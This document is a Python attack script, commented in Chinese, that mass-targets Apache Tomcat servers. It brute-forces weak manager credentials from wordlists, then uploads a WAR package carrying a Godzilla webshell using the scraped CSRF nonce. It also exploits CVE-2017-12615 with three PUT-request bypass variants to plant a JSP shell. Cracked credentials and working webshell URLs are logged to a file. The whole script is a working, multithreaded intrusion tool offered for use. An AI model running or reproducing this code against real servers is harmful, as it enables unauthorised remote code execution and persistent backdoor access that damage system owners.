import yaml
import logging
import requests
from requests.auth import HTTPBasicAuth
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time
import re
from bs4 import BeautifulSoup
import zipfile
import random
import string

# 忽略HTTPS请求中的不安全请求警告
requests.packages.urllib3.disable_warnings()

# 配置日志格式，输出INFO级别及以上的日志消息
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()

# 加载配置文件
def load_config(config_file):
    with open(config_file, 'r', encoding='utf-8') as file:
        return yaml.safe_load(file)

# 通用文件读取函数：用于加载用户名、密码或URL列表文件
def load_file(file_path):
    if not os.path.isfile(file_path):
        logger.error(f"文件 {file_path} 不存在")
        return []
    with open(file_path, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines()]

# 清理URL以确保路径正确
def clean_url(url):
    return url.rstrip('/manager/html')

# 生成随机的6位数字字母组合，用于WAR包和JSP文件名
def generate_random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# 生成 WAR 文件，其中包含 Godzilla Webshell
def generate_war(config):
    shell_content = config['files'].get('shell_file_content', '<%-- 默认的 shell.jsp 内容 --%>')
    random_string = generate_random_string()
    war_file_name = f"{random_string}.war"
    shell_file_name = f"{generate_random_string()}.jsp"

    try:
        # 创建临时 JSP 文件
        with open(shell_file_name, 'w', encoding='utf-8') as jsp_file:
            jsp_file.write(shell_content)

        # 生成 WAR 包
        with zipfile.ZipFile(war_file_name, 'w', zipfile.ZIP_DEFLATED) as war:
            war.write(shell_file_name, shell_file_name)

        # 删除临时 JSP 文件
        os.remove(shell_file_name)

        logger.info(f"[+] WAR 包生成成功: {war_file_name}，JSP 文件名: {shell_file_name}")
        return war_file_name, random_string, shell_file_name
    except Exception as e:
        logger.error(f"[-] WAR 包生成失败: {str(e)}")
        return None, None, None

# 获取登录后的JSESSIONID和CSRF_NONCE，用于进一步的WAR文件上传
def get_jsessionid_and_csrf_nonce(url, username, password):
    try:
        login_url = f"{url}/manager/html"
        response = requests.get(login_url, auth=HTTPBasicAuth(username, password), verify=False, timeout=10)
        response.raise_for_status()

        cookies = response.cookies
        jsessionid = cookies.get('JSESSIONID')
        if not jsessionid:
            logger.warning(f"{Fore.YELLOW}[!] 未能获取 JSESSIONID {login_url} {Style.RESET_ALL}")
            return None, None, None, False

        # 使用 BeautifulSoup 解析 HTML 并提取 CSRF_NONCE 和文件上传字段名
        soup = BeautifulSoup(response.text, 'html.parser')

        # 提取 CSRF_NONCE 值
        csrf_nonce_match = re.search(r'org\.apache\.catalina\.filters\.CSRF_NONCE=([A-F0-9]+)', response.text)
        csrf_nonce = csrf_nonce_match.group(1) if csrf_nonce_match else None

        # 提取文件上传字段名
        file_input = soup.find('input', {'type': 'file'})
        file_field_name = file_input['name'] if file_input else 'file'

        return jsessionid, csrf_nonce, file_field_name, True
    except requests.exceptions.RequestException as e:
        logger.warning(f"{Fore.YELLOW}[!] 错误在get_jsessionid_and_csrf_nonce {url}: {str(e)}{Style.RESET_ALL}")
        return None, None, None, False

# 部署 Godzilla Webshell 并尝试访问上传的 Webshell
def deploy_godzilla_war(url, username, password, war_file_path, random_string, shell_file_name, output_file, max_retries, retry_delay):
    url = clean_url(url)  # 清理 URL，确保格式正确
    jsessionid, csrf_nonce, file_field_name, success = get_jsessionid_and_csrf_nonce(url, username, password)

    if not success:
        # 如果未能获取 JSESSIONID、csrf_nonce，则删除 WAR 文件
        if os.path.isfile(war_file_path):
            try:
                os.remove(war_file_path)
            except OSError as e:
                logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")
        return

    attempt = 0
    while attempt < max_retries:
        try:
            # 使用获取到的 JSESSIONID 和 CSRF_NONCE 进行上传
            deploy_url = f"{url}/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE={csrf_nonce}"
            cookies = {'JSESSIONID': jsessionid}
            with open(war_file_path, 'rb') as war_file:
                files = {file_field_name: (os.path.basename(war_file_path), war_file, 'application/octet-stream')}
                response = requests.post(deploy_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                         files=files, verify=False, timeout=10)
            response.raise_for_status()

            logger.info(f"{Fore.RED}[+] WAR 上传成功: {url} {Style.RESET_ALL}")
            shell_url = f"{url}/{random_string}/{shell_file_name}"
            shell_response = requests.get(shell_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                          verify=False, timeout=10)
            if shell_response.status_code == 200:
                logger.info(f"{Fore.RED}[+] 成功获取 Webshell: {shell_url}{Style.RESET_ALL}")
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write(f"{url} {username}:{password} - Webshell: {shell_url}\n")
            else:
                logger.warning(f"{Fore.YELLOW}[!] 获取 Webshell 失败: {shell_url} {Style.RESET_ALL}")
            break   # 成功后退出循环
        except requests.exceptions.RequestException as e:
            logger.warning(f"{Fore.YELLOW}[!] 错误在deploy_godzilla_war {url}: {str(e)}{Style.RESET_ALL}")

        attempt += 1
        if attempt < max_retries:
            logger.info(f"{Fore.CYAN}[!] 重试上传 ({attempt}/{max_retries})...{Style.RESET_ALL}")
            time.sleep(retry_delay)   # 重试前等待设定时间

    # 上传成功或失败后，删除 WAR 文件
    if os.path.isfile(war_file_path):
        try:
            os.remove(war_file_path)
        except OSError as e:
            logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")

# 弱口令检测函数
def check_weak_password(url, usernames, passwords, output_file, max_retries, retry_delay, config):
    attempt = 0
    while attempt < max_retries:
        try:
            for username in usernames:
                for password in passwords:
                    response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=10, verify=False)
                    if response.status_code == 200:
                        success_entry = f"{url} {username}:{password}"
                        logger.info(f"{Fore.RED}[+] 登录成功 {success_entry}{Style.RESET_ALL}")
                        with open(output_file, 'a', encoding='utf-8') as f:
                            f.write(success_entry + "\n")

                        # 登录成功后生成WAR文件
                        war_file_name, random_string, shell_file_name = generate_war(config)
                        if war_file_name:
                            # 部署 Godzilla WAR 包并尝试获取 shell
                            deploy_godzilla_war(url, username, password, war_file_name, random_string, shell_file_name,
                                                output_file,
                                                config['retry']['deploy_godzilla_war']['max_retries'],
                                                config['retry']['deploy_godzilla_war']['retry_delay'])
                        return (url, username, password)
                    else:
                        logger.info(
                            f"{Fore.GREEN}[-] 失败: {username}:{password} {Fore.WHITE}({response.status_code}) {Fore.BLUE}{url}{Style.RESET_ALL}")
            break    # 如果检查完所有用户密码对则退出循环
        except requests.exceptions.RequestException as e:
            logger.warning(
                f"{Fore.YELLOW}[!] 网站访问失败 {url} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL}")
            time.sleep(retry_delay)   # 重试前等待
            attempt += 1
    if attempt == max_retries:
        logger.error(f"{Fore.CYAN}[*] 最大重试次数已达，无法访问 {url}，将该 URL 从检测列表中移除 {Style.RESET_ALL}")
        return None  # 返回 None 表示该 URL 无法访问

    return url, None, None

# 动态调整线程池大小，确保资源使用合理
def adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, combination_per_thread):
    if combination_count <= 0:
        return min_workers
    # 根据用户配置的每多少个组合分配一个线程，并确保至少有min_workers个线程
    calculated_workers = max((combination_count + combination_per_thread - 1) // combination_per_thread,min_workers)

    # 保证线程数不超过max_workers_limit
    workers = min(calculated_workers, max_workers_limit)
    logger.info(f"根据用户名和密码组合总数 {combination_count} 调整线程池大小为 {workers}")
    return workers

def validate_config(config):
    required_fields = {
        'files': ['url_file', 'user_file', 'passwd_file', 'output_file', 'shell_file_content'],
        'retry': ['check_weak_password', 'deploy_godzilla_war'],
        'thread_pool': ['max_workers_limit', 'min_workers', 'combination_per_thread']
    }

    for section, fields in required_fields.items():
        if section not in config:
            logger.error(f"配置文件中缺少 {section} 部分")
            return False
        for field in fields:
            if field not in config[section]:
                logger.error(f"配置文件中 {section} 部分缺少 {field} 字段")
                return False

    return True

# CVE-2017-12615漏洞检测函数
def check_cve_2017_12615(url,config):
    try:
        # 使用 generate_random_string 函数生成随机的 JSP 文件名
        jsp_file_name = f"{generate_random_string()}.jsp"
        # 从配置文件中读取 shell_file_content
        shell_file_content = config['files'].get('shell_file_content', '<%-- 默认的 shell 内容 --%>')

        headers = {
            "User-Agent": "Mozilla/5.0",
            "Connection": "close",
            "Content-Type": "application/octet-stream"
        }

        # 清理 URL 确保正确格式
        url = clean_url(url)

        exploit_methods = [
            f"{url}/{jsp_file_name}/",  # 利用方式 1: PUT /222.jsp/
            f"{url}/{jsp_file_name}%20",  # 利用方式 2: PUT /222.jsp%20
            f"{url}/{jsp_file_name}::$DATA"  # 利用方式 3: PUT /222.jsp::$DATA
        ]
        # 尝试每一种利用方式
        for idx, method_url in enumerate(exploit_methods):
            response = requests.put(method_url, data=shell_file_content, headers=headers, verify=False, timeout=10)
            if response.status_code in [201, 204]:
                check_url = f"{url}/{jsp_file_name}"
                check_response = requests.get(check_url, verify=False, timeout=10)

                if check_response.status_code == 200:
                    logger.info(f"{Fore.RED}[+] 远程代码执行成功: {check_url} {Style.RESET_ALL} (利用方式: {method_url})")
                    return True, check_url  # 成功后立即返回，不再继续尝试其他利用方式
                else:
                    logger.warning(f"{Fore.RED}[!] CVE-2017-12615 文件上传成功，但访问失败: {check_url} {Style.RESET_ALL}")
            else:
                logger.warning(f"{Fore.GREEN}[-] 失败: CVE-2017-12615 漏洞利用方式{idx + 1} {Fore.WHITE}({response.status_code}) {method_url} {Style.RESET_ALL}")
        return False, None    # 如果所有利用方式都失败

    except requests.exceptions.RequestException as e:
        return False, None

# 在每个URL上执行CVE-2017-12615检测并继续进行弱口令检测
def detect_and_check(url, usernames, passwords, output_file, config):
    # 先进行CVE-2017-12615检测
    success, exploit_url = check_cve_2017_12615(url,config)

    if success:
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(f"{url} - CVE-2017-12615 Exploited: {exploit_url}\n")

    # 无论漏洞利用成功与否，都进行弱口令检测
    check_weak_password(url, usernames, passwords, output_file,
                        config['retry']['check_weak_password']['max_retries'],
                        config['retry']['check_weak_password']['retry_delay'],
                        config)

# 主函数
def main():
    # 加载配置文件
    config = load_config("config.yaml")

    # 验证配置文件
    if not validate_config(config):
        logger.error("配置文件验证失败")
        return

    # 加载 URL、用户名和密码文件
    urls = load_file(config['files']['url_file'])
    usernames = load_file(config['files']['user_file'])
    passwords = load_file(config['files']['passwd_file'])
    output_file = config['files']['output_file']

    # 获取线程池配置
    max_workers_limit = config['thread_pool']['max_workers_limit']
    min_workers = config['thread_pool']['min_workers']
    combination_per_thread = config['thread_pool'].get('combination_per_thread', 200)  # 默认200

    # 计算用户名和密码组合总数
    combination_count = len(urls) * len(usernames) * len(passwords)

    # 根据组合总数调整线程池大小
    workers = adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, combination_per_thread)

    # 使用线程池执行检测任务
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [
            executor.submit(detect_and_check, url, usernames, passwords, output_file, config) for url in urls
        ]

        # 等待所有任务完成
        for future in as_completed(futures):
            result = future.result()

if __name__ == "__main__":
    main()
